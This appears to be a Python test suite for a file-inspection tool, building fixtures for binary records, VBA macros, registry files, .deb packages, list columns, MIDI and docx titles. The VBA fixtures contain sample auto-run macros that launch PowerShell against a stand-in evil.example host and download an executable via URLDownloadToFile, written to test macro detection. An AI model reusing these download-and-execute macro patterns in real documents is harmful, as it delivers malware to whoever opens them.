"""Left-over gaps from the held-out rounds: typed binary fields, VBA macro source, .reg files, .deb members, list columns,
every MIDI tempo/key event, docx Title paragraphs. Every fixture is built here from bytes; every expected figure comes from the code that wrote it."""
import importlib.util
import io
import json
import shutil
import struct
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.dont_write_bytecode = True
from test_v2 import SCRIPTS, run  # noqa: E402

sys.path.insert(0, str(SCRIPTS))
import dl_vba  # noqa: E402


def have(mod):
    return importlib.util.find_spec(mod) is not None


# ---------------------------------------------------------------- fixture builders
def ovba_literal(src):
    """Source text -> an MS-OVBA compressed container that uses only literal tokens (valid, if not small)."""
    out = bytearray(b"\x01")
    for i in range(0, len(src), 3000):
        piece = src[i:i + 3000]
        data = bytearray()
        for k in range(0, len(piece), 8):
            data += b"\x00" + piece[k:k + 8]
        out += struct.pack("<H", 0xB000 | (len(data) + 2 - 3)) + data
    return bytes(out)


def cfb(streams):
    """{'Storage/Stream': bytes} -> a minimal OLE compound file (512-byte sectors). Streams under 4096 bytes go in the mini stream, the rest in sectors."""
    names = list(streams)
    storages = sorted({n.split("/")[0] for n in names if "/" in n})
    ents = [("Root Entry", 5)] + [(x, 1) for x in storages] + [(n.split("/")[-1], 2) for n in names]
    n_dir = -(-len(ents) * 128 // 512)
    small = [n for n in names if len(streams[n]) < 4096]
    mini, mfat, mstart = b"", [], {}
    for n in small:
        mstart[n] = len(mini) // 64
        blocks = -(-len(streams[n]) // 64) or 1
        mfat += [len(mini) // 64 + i + 1 for i in range(blocks - 1)] + [0xFFFFFFFE]
        mini += streams[n].ljust(blocks * 64, b"\0")
    mini_secs = -(-len(mini) // 512)
    mfat_secs = 1 if mfat else 0
    fat = [0xFFFFFFFD]
    nxt = 1
    fat += [nxt + i + 1 for i in range(n_dir - 1)] + [0xFFFFFFFE]
    dir_start, nxt = nxt, nxt + n_dir
    mfat_start = nxt if mfat_secs else 0xFFFFFFFE
    if mfat_secs:
        fat += [0xFFFFFFFE]
        nxt += 1
    mini_start = nxt if mini_secs else 0xFFFFFFFE
    fat += [nxt + i + 1 for i in range(mini_secs - 1)] + ([0xFFFFFFFE] if mini_secs else [])
    nxt += mini_secs
    big, bstart = [], {}
    for n in names:
        if n not in small:
            data = streams[n].ljust(-(-len(streams[n]) // 512) * 512, b"\0")
            bstart[n] = nxt
            k = len(data) // 512
            fat += [nxt + i + 1 for i in range(k - 1)] + [0xFFFFFFFE]
            nxt += k
            big.append(data)
    assert len(fat) <= 128
    fat += [0xFFFFFFFF] * (128 - len(fat))
    d = bytearray()
    for i, (nm, t) in enumerate(ents):
        child = right = 0xFFFFFFFF
        start, size = 0xFFFFFFFE, 0
        if t == 5:
            child = 1
            start, size = mini_start, len(mini)
        elif t == 1:
            child = 1 + len(storages) + next(j for j, n in enumerate(names) if n.startswith(nm + "/"))
        else:
            j = i - 1 - len(storages)
            n = names[j]
            start, size = (mstart[n] if n in small else bstart[n]), len(streams[n])
            sibs = [k for k, m in enumerate(names) if m.rsplit("/", 1)[0] == n.rsplit("/", 1)[0]]
            if sibs.index(j) + 1 < len(sibs):
                right = 1 + len(storages) + sibs[sibs.index(j) + 1]
        raw = nm.encode("utf-16-le") + b"\0\0"
        d += raw.ljust(64, b"\0") + struct.pack("<HBBIII", len(raw), t, 1, 0xFFFFFFFF, right, child) + b"\0" * 36 + struct.pack("<IQ", start, size)
    d = bytes(d).ljust(n_dir * 512, b"\0")
    hdr = (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 16 + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6) + b"\0" * 6
           + struct.pack("<9I", 0, 1, dir_start, 0, 4096, mfat_start, mfat_secs, 0xFFFFFFFE, 0) + struct.pack("<109I", 0, *([0xFFFFFFFF] * 108)))
    mf = struct.pack("<128I", *(mfat + [0xFFFFFFFF] * (128 - len(mfat)))) if mfat_secs else b""
    return hdr.ljust(512, b"\0") + struct.pack("<128I", *fat) + d + mf + mini.ljust(mini_secs * 512, b"\0") + b"".join(big)


def vba_project():
    mod1 = ('Attribute VB_Name = "Module1"\r\n'
            'Sub AutoOpen()\r\n'
            '  Dim sh As Object\r\n'
            '  Set sh = CreateObject("WScript.Shell")\r\n'
            '  sh.Run "powershell -enc AAAA http://evil.example/p.ps1"\r\n'
            'End Sub\r\n'
            'Function Helper()\r\n  Shell "calc.exe"\r\nEnd Function\r\n').encode("latin-1")
    this = b'Attribute VB_Name = "ThisDocument"\r\nPrivate Sub Document_Open()\r\n  MsgBox "hello there"\r\nEnd Sub\r\n'
    pad = b"\xff\xff\x01\x00" * 4
    return cfb({"VBA/Module1": pad + ovba_literal(mod1), "VBA/ThisDocument": pad + ovba_literal(this), "VBA/dir": b"\x01\x00"})


class Left(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="dl_left_"))

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def look(self, path, *extra, tools=False):
        out = self.tmp / ("out_" + path.name)
        r = run([str(path), "--out", str(out), "--fresh", *([] if tools else ["--no-tools"]), *extra])
        self.assertIn(r.returncode, (0, 3), r.stderr[-1500:])
        lj = json.loads((out / "look.json").read_text(encoding="utf-8"))
        return r.stdout, lj, "\n".join(x["text"] for x in lj["stream"])

    # ---------------------------------------------------------------- 1 typed binary fields
    @unittest.skipUnless(have("numpy"), "numpy missing")
    def test_headerless_records_get_typed_fields(self):
        p = self.tmp / "rows.bin"
        names = [b"alpha", b"bravo", b"charlie", b"delta"]
        with open(p, "wb") as f:
            for i in range(1, 3001):
                f.write(struct.pack("<II12sdHH", i, 1735689600 + i * 60, names[i % 4], 100.5 + i * 0.37, i % 5, 0))
        out, lj, stream = self.look(p)
        self.assertIn("3,000 records of 32 bytes", stream)
        self.assertIn("uint32 1..3000", stream)
        self.assertIn("strictly increasing", stream)
        self.assertIn("timestamp (uint32 epoch seconds) 2025-01-01", stream)
        self.assertIn("fixed text, 12 bytes", stream)
        self.assertIn("'alpha'", stream)
        self.assertIn("float64 100.87..1210.5", stream)

    @unittest.skipUnless(have("numpy"), "numpy missing")
    def test_big_endian_integers_and_signed(self):
        p = self.tmp / "be.bin"
        with open(p, "wb") as f:
            for i in range(1, 2001):
                f.write(struct.pack(">ii", i, (i % 9) - 4) + b"\0\0\0\0")
        out, lj, stream = self.look(p)
        self.assertIn("big-endian", stream)
        self.assertIn("uint32 1..2000", stream)
        self.assertIn("int32 -4..4", stream)

    # ---------------------------------------------------------------- 2 VBA
    def test_ovba_decompress_copy_token(self):
        self.assertEqual(dl_vba.decompress(bytes([0x01, 0x05, 0xB0, 0x08, 0x61, 0x62, 0x63, 0x03, 0x20])), b"abcabcabc")

    def test_vba_modules_read_from_ole(self):
        r = dl_vba.analyse(dl_vba.read_cfb(vba_project()))
        self.assertEqual(sorted(p.split("/")[-1] for p, _ in r["modules"]), ["Module1", "ThisDocument"])
        self.assertEqual(r["auto"], ["AutoOpen", "Document_Open"])
        self.assertIn("CreateObject", r["suspicious"])
        self.assertIn("Shell", r["suspicious"])

    def test_xlsm_macro_flag_source_and_keywords(self):
        p = self.tmp / "book.xlsm"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
            z.writestr("xl/workbook.xml", '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="S" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets></workbook>')
            z.writestr("xl/_rels/workbook.xml.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>')
            z.writestr("xl/vbaProject.bin", vba_project())
        out, lj, stream = self.look(p)
        flags = " ".join(f"{f['kind']} {f.get('what', '')} {f.get('detail', '')}" for f in lj.get("flags", []))
        self.assertIn("MACRO", flags)
        self.assertIn("AUTO-EXEC-MACRO", flags)
        self.assertIn("2 module(s)", stream)
        self.assertIn("Document_Open", stream)
        self.assertIn("http://evil.example/p.ps1", stream)

    def test_legacy_ole_with_vba_storage(self):
        p = self.tmp / "old.doc"
        blob = cfb({"WordDocument": b"\0" * 4096, "Macros/VBA/Module1": vba_project() and (b"\xff\xff" + ovba_literal(b'Attribute VB_Name = "M"\r\nSub Auto_Open()\r\n URLDownloadToFile 0, "http://x.example/a.exe", "c:\\a.exe", 0, 0\r\nEnd Sub\r\n'))})
        p.write_bytes(blob)
        r = dl_vba.analyse(dl_vba.read_cfb(blob))
        self.assertEqual(r["auto"], ["Auto_Open"])
        self.assertIn("URLDownloadToFile", r["suspicious"])

    # ---------------------------------------------------------------- 3 .reg
    def test_reg_v5_keys_values_deletions(self):
        text = ('Windows Registry Editor Version 5.00\r\n\r\n'
                '[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n'
                '@="default text"\r\n'
                '"Updater"="C:\\\\Tools\\\\upd.exe -silent"\r\n'
                '"Old"=-\r\n\r\n'
                '[HKEY_CURRENT_USER\\Software\\Demo]\r\n'
                '"Flag"=dword:00000001\r\n'
                '"Blob"=hex:01,02,03,\\\r\n  04,05\r\n'
                '"Path"=hex(2):25,00,54,00,45,00,4d,00,50,00,25,00,00,00\r\n\r\n'
                '[-HKEY_CURRENT_USER\\Software\\Gone]\r\n')
        p = self.tmp / "t.reg"
        p.write_bytes(b"\xff\xfe" + text.encode("utf-16-le"))
        out, lj, stream = self.look(p)
        self.assertIn("3 keys (1 marked for deletion), 5 values set, 1 values marked for deletion", stream)
        self.assertIn("delete key HKEY_CURRENT_USER\\Software\\Gone", stream)
        self.assertIn("delete value Old", stream)
        self.assertIn("Updater = sz:C:\\Tools\\upd.exe -silent", stream)
        self.assertIn("Path = expand_sz:%TEMP%", stream)
        self.assertIn("'binary': 1", stream)

    def test_reg_regedit4_ascii(self):
        p = self.tmp / "old.reg"
        p.write_text('REGEDIT4\n\n[HKEY_CLASSES_ROOT\\.zzz]\n@="zzzfile"\n"Content Type"="application/x-zzz"\n', encoding="ascii")
        out, lj, stream = self.look(p)
        self.assertIn("REGEDIT4", stream)
        self.assertIn("1 keys (0 marked for deletion), 2 values set", stream)

    # ---------------------------------------------------------------- 4 .deb
    def test_deb_control_fields_and_data_files_xz_and_gz(self):
        def tar(files, mode):
            bio = io.BytesIO()
            with tarfile.open(fileobj=bio, mode=mode) as t:
                for n, b in files.items():
                    ti = tarfile.TarInfo(n)
                    ti.size = len(b)
                    t.addfile(ti, io.BytesIO(b))
            return bio.getvalue()

        def ar(members):
            out = b"!<arch>\n"
            for n, b in members:
                out += f"{n + '/':<16}{0:<12}{0:<6}{0:<6}{100644:<8}{len(b):<10}".encode() + b"`\n" + b + (b"\n" if len(b) % 2 else b"")
            return out
        ctl = b"Package: demo-tool\nVersion: 1.2.3-1\nArchitecture: amd64\nMaintainer: Ann <a@example.org>\nDepends: libc6 (>= 2.31), zlib1g\nDescription: A demo tool\n second long line\n"
        for comp, mode in (("xz", "w:xz"), ("gz", "w:gz")):
            deb = ar([("debian-binary", b"2.0\n"), (f"control.tar.{comp}", tar({"./control": ctl, "./md5sums": b"x  usr/bin/demo\n"}, mode)),
                      (f"data.tar.{comp}", tar({"./usr/bin/demo": b"#!/bin/sh\n", "./usr/share/doc/demo/README": b"hi"}, mode))])
            p = self.tmp / f"demo_{comp}.deb"
            p.write_bytes(deb)
            out, lj, stream = self.look(p)
            self.assertIn("Package: demo-tool", stream)
            self.assertIn("Version: 1.2.3-1", stream)
            self.assertIn("Depends: libc6 (>= 2.31), zlib1g", stream)
            self.assertIn("Maintainer: Ann <a@example.org>", stream)
            self.assertIn("Description (first line): A demo tool", stream)
            self.assertNotIn("second long line", stream.split("Description (first line)")[1][:40])
            self.assertIn("./usr/bin/demo", stream)

    # ---------------------------------------------------------------- 5 list columns
    @unittest.skipUnless(have("pyarrow"), "pyarrow missing")
    def test_parquet_list_column_stats(self):
        import pyarrow as pa
        import pyarrow.parquet as pq
        tags = [["a", "b"] if i % 4 == 0 else [] if i % 4 == 1 else None if i % 4 == 2 else ["x", "y", "z", "w", "v"][: 1 + i % 5] for i in range(400)]
        p = self.tmp / "lists.parquet"
        pq.write_table(pa.table({"id": list(range(400)), "tags": pa.array(tags, pa.list_(pa.string()))}), p)
        out, lj, stream = self.look(p, "--tier", "standard", tools=True)
        exp = [t for t in tags if t is not None]
        self.assertIn(f"tags: list column, {len(exp):,} lists, length min 0 / mean {sum(map(len, exp)) / len(exp):.2f} / max {max(map(len, exp))}, 100 null cells", stream)
        self.assertIn("element type string", stream)

    def test_csv_json_array_cells(self):
        p = self.tmp / "cells.csv"
        rows = ["id,scores,name"] + [f'{i},"[{",".join(str(k) for k in range(i % 4))}]",n{i}' for i in range(1, 61)]
        p.write_text("\n".join(rows) + "\n", encoding="utf-8")
        out, lj, stream = self.look(p)
        lens = [i % 4 for i in range(1, 61)]
        self.assertIn(f"scores: list column, 60 lists, length min 0 / mean {sum(lens) / 60:.2f} / max 3, 0 null cells, {lens.count(0)} empty lists, element type int", stream)
        self.assertNotIn("name: list column", stream)

    # ---------------------------------------------------------------- 6 MIDI
    def test_midi_lists_every_tempo_and_key_event(self):
        def track(ev):
            d = b"".join(ev) + b"\x00\xff\x2f\x00"
            return b"MTrk" + struct.pack(">I", len(d)) + d
        tempo = lambda dt, us: bytes([dt]) + b"\xff\x51\x03" + us.to_bytes(3, "big")
        key = lambda dt, sf, mi: bytes([dt]) + b"\xff\x59\x02" + struct.pack("bB", sf, mi)
        t0 = track([tempo(0, 500000), key(0, 2, 0), tempo(96, 400000), key(96, -3, 1), tempo(96, 250000), key(0, 0, 0)])
        p = self.tmp / "m.mid"
        p.write_bytes(b"MThd" + struct.pack(">IHHH", 6, 1, 1, 96) + t0)
        out, lj, stream = self.look(p)
        self.assertIn("All 3 set_tempo events: tick 0 (0.00 s): 120.00 BPM; tick 96 (0.50 s): 150.00 BPM; tick 288 (1.30 s): 240.00 BPM", stream)
        self.assertIn("All 3 key_signature events: tick 0 (0.00 s): 2 sharps major; tick 192 (0.90 s): 3 flats minor; tick 288 (1.30 s):", stream)

    # ---------------------------------------------------------------- 7 docx Title
    def test_docx_title_and_subtitle_paragraphs(self):
        W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
        p = self.tmp / "t.docx"
        body = ('<w:p><w:pPr><w:pStyle w:val="Titel"/></w:pPr><w:r><w:t>Annual Review 2026</w:t></w:r></w:p>'
                '<w:p><w:pPr><w:pStyle w:val="Subtitle"/></w:pPr><w:r><w:t>Prepared for the board</w:t></w:r></w:p>'
                '<w:p><w:pPr><w:pStyle w:val="Heading1"/></w:pPr><w:r><w:t>Intro</w:t></w:r></w:p><w:p><w:r><w:t>Body text here.</w:t></w:r></w:p>')
        styles = (f'<w:styles xmlns:w="{W}"><w:style w:type="paragraph" w:styleId="Titel"><w:name w:val="Title"/></w:style>'
                  f'<w:style w:type="paragraph" w:styleId="Subtitle"><w:name w:val="Subtitle"/></w:style></w:styles>')
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
            z.writestr("word/document.xml", f'<?xml version="1.0"?><w:document xmlns:w="{W}"><w:body>{body}</w:body></w:document>')
            z.writestr("word/styles.xml", styles)
        out, lj, stream = self.look(p)
        self.assertIn("Document title paragraphs: Title: Annual Review 2026; Subtitle: Prepared for the board", stream)
        first = out.split("Not looked at")[0]
        self.assertIn("Annual Review 2026", first)


if __name__ == "__main__":
    unittest.main()
